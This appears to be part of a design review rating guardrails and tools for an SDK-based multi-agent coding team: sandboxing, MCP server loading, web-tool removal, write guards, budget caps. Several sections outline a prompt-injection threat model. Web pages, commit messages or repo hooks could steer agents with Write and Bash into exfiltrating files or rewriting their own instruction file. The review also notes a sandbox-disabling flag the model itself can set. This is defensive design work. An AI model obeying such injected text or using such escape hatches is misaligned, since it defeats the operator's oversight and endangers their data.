- **What it achieves:** Bash can write only inside `--cwd` (plus temp directories), can't read listed secret paths, and can reach only allowlisted domains (package registries, for example). That is enforced by the OS, whatever the command text says.
- **How it would work:** `sandbox: { enabled: true, allowUnsandboxedCommands: false, filesystem: { allowWrite: […], denyRead: […] }, network: { allowedDomains: […], allowLocalBinding: true } }`:
  - The option is at `sdk.d.ts:2150-2191` and its schema at `:3460-3559`.
  - `filesystem` is at `:3481-3488` and `network` at `:3465-3480`.
  - `allowLocalBinding` (`:3472`) is for dev servers and test runners.
  - `failIfUnavailable` defaults to true when enabled (`sdk.d.ts:2164-2168`).
  - `BashInput` has a `dangerouslyDisableSandbox` escape hatch the model can set (`sdk-tools.d.ts:817-820`). Set `allowUnsandboxedCommands: false` (`sdk.d.ts:3464`) and also deny that flag in #2.

  Size: **tens of lines**, plus an experiment.

- **Impact:**
  - Quality: some legitimate commands will fail, such as installs from an unlisted registry or Docker. `excludedCommands` (`sdk.d.ts:3552`) is the escape valve.
  - Safety: the biggest single gain available. It also limits what a hostile target-repo hook can do from inside Bash.
  - Cost: no tokens. Some latency.
  - Prompt cache: no change **[Inferred]**.
- **Risks and open questions:**
  - **Unresolved by the types:** the option's doc says filesystem and network restrictions "are configured via permission rules, not via these sandbox settings" (`sdk.d.ts:2156-2159`), yet the schema has `filesystem` and `network` blocks (`:3465-3488`). Which one governs needs a test.
  - Whether subagent Bash calls are sandboxed is also unresolved.
  - It needs macOS Seatbelt or Linux bubblewrap on the operator's machine.
  - Target repos with heavy native builds may fight the sandbox.
- **Rating:** **Usefulness 4.** It backs the `--yes` guarantee, but it can't stop deletion inside `--cwd`, so I chose 4 over 5. **Priority P2.** Blocker: one sandboxed run against a representative target repo to settle the governing-config question and the subagent coverage.
- **Smallest useful version:** `enabled: true`, `allowUnsandboxedCommands: false`, writes limited to `--cwd` and the temp directory, network to npm/pnpm registries plus localhost, behind a `--sandbox` flag until proven.

### 7. Browser verification (Playwright MCP)

- **Kind and roles:** An external stdio MCP server, attached per agent. Start with qa-tester and later add frontend-engineer.
- **Purpose:** "You cannot see a browser" (`frontend-engineer/prompt.md:14`). UX specifies states, focus order and responsive behavior (`ux-designer/prompt.md:7-10`) that no role can observe.
- **What it achieves:** qa-tester can start the dev server, load the page, take an accessibility snapshot and check each state the spec lists (empty, error, keyboard focus order), then quote what it saw.
- **How it would work:** `AgentDefinition.mcpServers` (`sdk.d.ts:59`) takes `AgentMcpServerSpec` (`:124`), a stdio config (`McpStdioServerConfig`, `:1331-1339`). Add the server's tool names to that role's `tools`. The dev server runs through Bash `run_in_background` (`sdk-tools.d.ts:813-816`). Size: **tens of lines of config**, plus a pinned server version.
- **Impact:**
  - Quality: the team can verify frontend acceptance criteria instead of asserting them.
  - **Safety:** page content is untrusted input going to a role that holds Write and Bash. A page, or a third-party script on it, can carry instructions. Limit navigation to `localhost` with the server's own allowlist (that's a server feature, not something in the SDK types), and prefer this after #6.
  - Cost: snapshots and screenshots are large, plausibly thousands of tokens each on opus **[Inferred]**.
  - Prompt cache: the tool definitions are stable only if the server version is pinned. A floating `@latest` can change tool schemas between runs and break the cache. MCP tools may also be deferred behind tool search unless `alwaysLoad` is set (`sdk.d.ts:1185-1188`).
- **Risks and open questions:** Tool-name syntax for MCP tools inside `AgentDefinition.tools` isn't spelled out beyond the `mcp__server` forms mentioned under `disallowedTools` (`sdk.d.ts:47-50`). Also, does the orchestrator (preset tools) see an agent-scoped MCP server? The types don't say.
- **Rating:** **Usefulness 4.** It lets roles do what their prompts require on common web tasks. **Priority P2.** Blockers: the owner's decision on the injection channel, and #6 landing first.
- **Smallest useful version:** qa-tester only, `localhost` only, accessibility snapshots and no screenshots, pinned version.

### 8. `strictMcpConfig: true`

- **Kind and roles:** An SDK option. It constrains the orchestrator, which gets every MCP tool through the preset **[Inferred]**.
- **Purpose:** Target repos' `.mcp.json` servers load today (`src/orchestrator/index.ts:55-60`). `denyReason` has no rules for `mcp__*` tools **[Observed]**.
- **What it achieves:** Only servers this CLI passes are loaded. A target repo can't hand the manager a database or deployment tool the safety layer doesn't understand.
- **How it would work:** `strictMcpConfig` "ignor[es] all other MCP configurations: project `.mcp.json`, user settings, plugins, and on-disk agent frontmatter" (`sdk.d.ts:2291-2298`). Size: **one line.**
- **Impact:**
  - Safety: closes one half of the trust boundary. Target hooks still load.
  - Quality: lost only if target MCP servers were useful.
  - Cost: none.
  - Prompt cache: makes the tool list stable across target repos, a small gain.
- **Risks and open questions:** It removes MCP servers some targets may rely on. It doesn't affect target `settings.json` hooks; those need `settingSources` changes, which would also drop `CLAUDE.md` (`sdk.d.ts:2247`).
- **Rating:** **Usefulness 3.** A clear guardrail improvement, but the team works without it, and the owner has already accepted the trust boundary in writing. **Priority P2.** Blocker: the owner must decide whether target-repo MCP servers are wanted (section 7, question 1).
- **Smallest useful version:** Set it, and note in usage text that target `.mcp.json` is ignored.

### 9. Remove WebSearch and WebFetch from non-research advisory roles

- **Kind and roles:** Built-in tool removal, affecting architect, product-manager, ux-designer and monetization-expert.
- **Purpose:** These four prompts never ask for web research (`architect/prompt.md:13`, `product-manager/prompt.md:13`, `ux-designer/prompt.md:13`, `monetization-expert/prompt.md:13`). They still hold `WebFetch` alongside `Read` (`shared.ts:13-19`), which is both an injection source and an exfiltration path.
- **What it achieves:** Only business-strategist can reach the web, and it can't write files or run commands.
- **How it would work:** Add a local-only read set (`["Read","Grep","Glob"]`) in `shared.ts` and use it in those four `index.ts:7` lines. Size: **a few lines.**
- **Impact:**
  - Quality: slight loss if a role occasionally benefits from looking something up.
  - Safety: removes the exfiltration step for four roles.
  - Cost: fewer tool-definition tokens per delegation.
  - Prompt cache: a one-time miss when the change ships, then stable.
- **Risks and open questions:** monetization-expert might want competitor pricing. That's the owner's call.
- **Rating:** **Usefulness 3.** A clear safety and efficiency gain, but the team works acceptably without it. **Priority P2.** Blocker: the owner must confirm which roles need the web (section 7, question 4). This is also listed in section 6.
- **Smallest useful version:** Remove web tools from architect, product-manager and ux-designer, and leave monetization-expert until decided.

### 10. Main-thread write guard

- **Kind and roles:** A hook rule that denies Write, Edit and NotebookEdit when `agent_id` is absent. It constrains the orchestrator.
- **Purpose:** The manager "do[es] not do the specialist work" (`orchestrator/prompt.md:1`) but holds the full preset (`orchestrator/index.ts:49`). If it edits code itself, there's no specialist diff and no QA ordering.
- **What it achieves:** Every file change comes from a named role, which makes #3 and #5 complete.
- **How it would work:** `agent_id` is "Absent for the main thread" (`sdk.d.ts:180-183`). Don't narrow `Options.tools` instead. It's "the base set of available built-in tools" (`sdk.d.ts:1628-1640`), and agents without `tools` "inherit… from parent" (`:44`), so narrowing it would probably remove Write and Bash from implementers too **[Inferred; unresolved by types]**. Size: **tens of lines.**
- **Impact:** Quality: enforces the decomposition principle. Safety: slight gain. Cost: none. Prompt cache: no change.
- **Risks and open questions:** Should the manager keep Bash to check evidence itself? That's section 7, question 3. If `agent_id` is ever absent inside a subagent, implementers would be blocked. Confirm in the same experiment as #1.
- **Rating:** **Usefulness 3.** It improves quality on a common class of tasks, and the prompt already mostly gets compliance. **Priority P2.** It depends on the owner's answer on manager tools and shares the experiment with #1.
- **Smallest useful version:** Deny only Write, Edit and NotebookEdit on the main thread, and leave Bash.

### 11. Run budget and per-agent turn caps

- **Kind and roles:** SDK options. They affect all roles.
- **Purpose:** The ceiling for unattended runs (`orchestrator/index.ts:62-63`) is the manager's turn count. Each delegation can be a long opus run (commit `e3ef368`).
- **What it achieves:** An unattended `--yes` run can't spend beyond a set dollar amount, and no single specialist can loop indefinitely.
- **How it would work:** `maxBudgetUsd` stops with `error_max_budget_usd` (`sdk.d.ts:1931-1935`), which `runTeam` already reports as `Run ended: <subtype>` (`orchestrator/index.ts:82-84`). `AgentDefinition.maxTurns` (`sdk.d.ts:72-75`) adds a per-role cap. Size: **tens of lines.**
- **Impact:** Quality: neutral, or negative if caps are too tight. Safety: bounds cost. Cost: none. Prompt cache: no change.
- **Risks and open questions:** **Unresolved by the types:** whether `Options.maxTurns` counts subagent turns (`sdk.d.ts:1926-1930` says "conversation turns"), and whether `maxBudgetUsd` includes subagent spend. If `maxTurns` doesn't count subagent turns, the existing "ceiling" is looser than the comment implies. One cheap run can settle both.
- **Rating:** **Usefulness 3.** An efficiency and cost guardrail the team works without. **Priority P2.** Blocker: the owner picks a default budget (section 7, question 5).
- **Smallest useful version:** A `--max-budget-usd` flag with no default, passed through.

### 12. Read-only `explain_query` tool

- **Kind and roles:** A custom in-process tool (`tool()` plus `createSdkMcpServer`) for database-specialist.
- **Purpose:** "Quantify performance claims with the query plan" (`database-specialist/prompt.md:15`).
- **What it achieves:** database-specialist can quote an actual `EXPLAIN (FORMAT JSON)` plan for the query it is indexing.
- **How it would work:** `tool(name, description, zodShape, handler)` (`sdk.d.ts:9610-9614`) inside `createSdkMcpServer` (`sdk.d.ts:600-630`), registered in `Options.mcpServers` (`:1946-1960`) and referenced from the agent's `mcpServers` by name (`:59`, `:124`). The handler runs `EXPLAIN` without `ANALYZE` in a `READ ONLY` transaction with a statement timeout, using a connection string from the operator's environment, never from the target repo. Size: **low hundreds of lines.**
- **Impact:**
  - Quality: real numbers on database tasks.
  - Safety: query plans contain schema names, not row data. A connection to anything but a disposable database is a risk.
  - Cost: small.
  - Prompt cache: a static tool definition, so it's stable.
- **Risks and open questions:** Most target repos won't have a reachable non-production database. Bash plus `psql` already covers the case where one exists. Whether an in-process server listed only in `Options.mcpServers` is hidden from the orchestrator is unresolved; `disallowedTools` is the fallback (`sdk.d.ts:1596-1601`).
- **Rating:** **Usefulness 3.** A real quality gain, but only on database tasks with a database present. **Priority P3.** What would change the call: the owner regularly runs database-heavy tasks against disposable databases (for example per-run branches).

### 13. Worktree isolation for parallel implementers

- **Kind and roles:** The `Agent` tool's `isolation: "worktree"` (`sdk-tools.d.ts:783-786`), for implementers and qa-tester.
- **Purpose:** The manager runs independent tasks in parallel (`orchestrator/prompt.md:10`) in one working tree. qa-tester has to show regression tests "fail before the fix" (`qa-tester/prompt.md:7`), which means checking out pre-fix code while others edit.
- **What it achieves:** Each parallel implementer works on its own branch (`AgentOutput.worktreePath` and `worktreeBranch`, `sdk-tools.d.ts:147-148`). QA can test the pre-fix state without disturbing anyone.
- **How it would work:** Prompt guidance plus #1 permitting `isolation: "worktree"`. Merging back needs git operations, which `PROTECTED_IN_COMMAND`'s `.git/` rule may interfere with (`permissions.ts:48`). Size: **hundreds of lines** of prompt and process once merging is included.
- **Impact:** Quality: fewer collisions. Safety: neutral. Cost: disk use and merge turns. Prompt cache: no change.
- **Risks and open questions:** Worktree cleanup, merge conflicts, and whether `--cwd` must be a git repository. None are settled by the types.
- **Rating:** **Usefulness 3.** **Priority P3.** What would change the call: transcripts or ledger data (#3) showing parallel implementers clobbering each other.

### 14. Read-only git history tool

- **Kind and roles:** A custom in-process tool (`git_log`, `git_show`, `git_blame` via `execFile`, with no shell) for architect and product-manager.
- **Purpose:** The architect must plan "the migration path from the code that exists today" (`architect/prompt.md:10`) without Bash.
- **What it achieves:** Advisory roles can cite why a structure exists, not only where it is.
- **How it would work:** `tool()` and `createSdkMcpServer` (`sdk.d.ts:9610-9614`, `:600-630`). Size: **tens to low hundreds of lines.**
- **Impact:** Commit messages are untrusted input going to roles that, after #9, can't exfiltrate. Cost is small. Prompt cache: static.
- **Risks and open questions:** The manager can already pass relevant history in the delegation prompt (`orchestrator/prompt.md:9`), which covers most of the need.
- **Rating:** **Usefulness 2.** It helps a narrow set of tasks. **Priority P3.** What would change the call: architecture output that repeatedly misreads history.

### 15. Mobile simulator MCP

- **Kind and roles:** An external MCP server for mobile-developer.
- **Purpose:** "You cannot run a simulator here" (`mobile-developer/prompt.md:15`).
- **What it achieves:** Device-level checks of React Native changes.
- **How it would work:** A stdio server via `AgentDefinition.mcpServers` (`sdk.d.ts:59`, `:1331`). Size: **hundreds of lines** including build orchestration, macOS only.
- **Impact:** Slow builds, large screenshots, and an injection surface from app content. The prompt already makes the gap explicit and honest.
- **Rating:** **Usefulness 2.** **Priority P3.** What would change the call: mobile work becoming the main use of the team.

### 16. Web access for implementers

- **Kind and roles:** Built-in tool addition (WebSearch, WebFetch) for the implementers and qa-tester.
- **Purpose:** Current library docs, for example whether an Expo config plugin is needed (`mobile-developer/prompt.md:14`).
- **What it achieves:** Fewer wrong-API guesses.
- **Impact:** **Safety:** it gives the three ingredients of exfiltration (private files, untrusted web content, an outbound channel) to roles that also hold Write and Bash. That's the worst placement in the team. Installed packages' types and READMEs are readable locally with Read, and business-strategist can research and hand findings over.
- **Rating:** **Usefulness 3.** **Don't build.** Instead, tell implementers to read `node_modules/<pkg>` docs and types, and have the manager route open questions to an advisory role.

### 17. Markdown-only Write for ux-designer

- **Kind and roles:** Built-in tool addition plus a path-restricting hook, for ux-designer.
- **Purpose:** The prompt and tools disagree (`ux-designer/prompt.md:14` vs `ux-designer/index.ts:7`).
- **Rating:** **Usefulness 1.** A prompt edit closes the gap, because the manager already relays specs in delegation prompts (`orchestrator/prompt.md:9`). **Don't build.** Edit the prompt instead (section 6).

### 18. qa-tester write scope (tests only)

- **Kind and roles:** A hook that denies qa-tester writes outside test paths, keyed on `agent_type` (`sdk.d.ts:184-187`).
- **Purpose:** The judge holds full `IMPLEMENTER` tools (`qa-tester/index.ts:12`) and could "fix" what it's judging, which blurs the reviewable-artifacts principle (`shared.ts:8-12`).
- **Rating:** **Usefulness 2.** A prompt line covers most of this, and test-path conventions vary per repo, so a hook would produce false denials. **Don't build.** Add the prompt line (section 6). Revisit if the ledger (#3) shows qa-tester editing non-test files.

### 19. Structured-report tool

- **Kind and roles:** A custom tool (`submit_report` with a zod schema per role) for all specialists.
- **Rating:** **Usefulness 1.** Every prompt already specifies its report structure, and #5's `SubagentStop` check can enforce the one that matters (QA evidence). **Don't build.** If needed later, add a schema check inside the `SubagentStop` hook instead of a new tool.

### 20. Code-intelligence MCP (LSP or Serena)

- **Kind and roles:** An external MCP server for architect and the engineers.
- **Rating:** **Usefulness 1.** The SDK's built-in tool union has no LSP tool (`sdk-tools.d.ts:11-55`), but Grep and Glob are enough for `path:line` citations in the repos this team targets. It would add a long-lived process and tool-definition tokens to every delegation. **Don't build.**

### 21. Payment-provider MCP (Stripe)

- **Kind and roles:** An external MCP server for monetization-expert.
- **Rating:** **Usefulness 1.** The role designs from the code (`monetization-expert/prompt.md:13`) and hands off implementation (`:17`). Live billing data would mean production credentials in a role that reads untrusted repo content. **Don't build.**

---

## 6. Prompt-only fixes

Each of these is a prompt or tool-list edit. Prompt files reload on the next run (`src/prompts.ts:4-5`). Expect one prompt-cache miss when each change ships.

| File and line                                                                                                    | Gap                                                                                | Suggested change                                                                                                                                                                               |
| ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `src/agents/ux-designer/prompt.md:14`                                                                            | Allows writing Markdown, but the role has no Write                                 | Replace "You produce specs and may write markdown, but do not implement components" with "You produce specs as your final message — you cannot write files — and do not implement components". |
| `src/agents/monetization-expert/prompt.md:17`                                                                    | "hand … to backend-engineer and … qa-tester" is impossible without an `Agent` tool | "You design. End with what backend-engineer must implement and what qa-tester must review; the Engineering Manager routes it."                                                                 |
| `src/agents/database-specialist/prompt.md:16`                                                                    | "stop for confirmation" has no channel inside a subagent                           | "Do not run anything that risks data loss. End your turn with the exact command, what it would destroy, and the rollback, so the manager can ask the human."                                   |
| `src/agents/database-specialist/prompt.md:15`                                                                    | Asks for query plans with no database present                                      | Append: "If no non-production database is reachable, say the performance claim is unmeasured and name the query and index you would check."                                                    |
| `src/agents/qa-tester/prompt.md:7`                                                                               | The judge can edit what it judges (#18)                                            | Append a rule: "Change only test files. Report defects in production code with reproduction steps; do not fix them."                                                                           |
| `src/orchestrator/prompt.md:9`                                                                                   | Nothing tells the manager to stay on the roster (#1)                               | Append: "Delegate only to the roles listed above, by name, and do not override their model."                                                                                                   |
| `src/orchestrator/prompt.md:16`                                                                                  | Evidence can't be checked yet                                                      | Once #3 ships, append: "The harness records every command each specialist runs; check claims against it."                                                                                      |
| `src/agents/frontend-engineer/prompt.md:14`                                                                      | No visual check, and no instruction to use the checks that exist                   | Append: "Run the project's existing lint, type-check and component or accessibility tests, and quote their output."                                                                            |
| `src/agents/shared.ts:13-19` with `architect/index.ts:7`, `product-manager/index.ts:7`, `ux-designer/index.ts:7` | Surplus web tools (#9)                                                             | Add `LOCAL_READ_ONLY = ["Read","Grep","Glob"]` and use it for these three roles, pending the owner's answer on monetization-expert.                                                            |

---

## 7. Open questions for the owner

1. **Do you want target repos' MCP servers and hooks to load?** If not, #8 becomes a one-line P1. If yes, #2's `mcp__*` rule becomes more important.
2. **May qa-tester edit non-test code?** If not, add the prompt line in section 6. A tests-only hook (#18) would then be the enforcement fallback.
3. **Should the manager keep Bash, or only delegate?** This decides #10's scope, and whether the manager can check evidence itself instead of relying on #3.
4. **Which advisory roles need the web?** My reading is business-strategist only. This settles #9.
5. **What dollar ceiling is acceptable for an unattended `--yes` run?** This settles #11's default.
6. **Will the team regularly target web UIs, live databases or mobile apps?** That decides whether #7, #12 and #15 move up.
7. **Will unattended runs happen on CI machines or only on your laptop?** On shared machines, #6 (sandbox) moves toward P1.
8. **Should edits to `CLAUDE.md` be protected like `.claude/`?** An injected agent can change instructions that load on the next run. Protecting it also blocks legitimate documentation tasks.

### Claims the SDK types leave unresolved, and how to settle them

| Question                                                                                                                      | Where the types stop                                                                              | How to settle                                                                                                  |
| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Are built-in agents (`general-purpose`) offered next to `agents`?                                                             | `AgentInput.subagent_type` is optional (`sdk-tools.d.ts:762`). The default is only in the binary. | Read `agents` from the `system`/`init` message on the next real run (`render.ts:21` already prints the count). |
| Is the delegation tool named `Agent` or `Task`?                                                                               | `sdk.d.ts:106-107` vs `render.ts:80`                                                              | Match both in #1, and log `tool_name` once.                                                                    |
| Does a non-zero Bash exit fire `PostToolUse` or `PostToolUseFailure`, and with what data?                                     | `BashOutput` has no exit code (`sdk-tools.d.ts:3236-3341`)                                        | One haiku run executing `false` with both hooks logging.                                                       |
| Does `Options.tools` narrow subagents' tools?                                                                                 | `sdk.d.ts:44`, `:1628-1640`                                                                       | One run with a narrowed list, checking an implementer's available tools in `init`.                             |
| Do `maxTurns` and `maxBudgetUsd` count subagent turns and spend?                                                              | `sdk.d.ts:1926-1935`                                                                              | One run with a low cap and a delegation.                                                                       |
| Which governs sandbox restrictions, permission rules or `sandbox.filesystem`/`network`? Does the sandbox cover subagent Bash? | `sdk.d.ts:2156-2159` vs `:3465-3488`                                                              | One sandboxed run that tries an outside-`cwd` write from a subagent.                                           |
| How do `Stop` and `SubagentStop` behave with background delegations?                                                          | `sdk.d.ts:9447-9450`, `sdk-tools.d.ts:767-770`                                                    | One run with a `Stop` hook logging `background_tasks`.                                                         |
| How does `HookCallbackMatcher.matcher` match (regex or exact)?                                                                | `sdk.d.ts:968-973` (undocumented)                                                                 | Keep filtering inside the callback, as the existing hook does.                                                 |
| Does resume tolerate changed agent definitions or a different `cwd`?                                                          | `sdk.d.ts:2081-2084`, `:1807-1814`                                                                | Resume after editing one `prompt.md`, and inspect `init`.                                                      |
| Does `acceptEdits` auto-approve writes outside `cwd`?                                                                         | `sdk.d.ts:1983-1991`                                                                              | Made moot by #2's containment rule.                                                                            |
| Are agent-scoped MCP servers visible to the orchestrator?                                                                     | `sdk.d.ts:59`, `:124`, `:1946-1960`                                                               | One run with a scoped server, checking the orchestrator's `init` tool list.                                    |
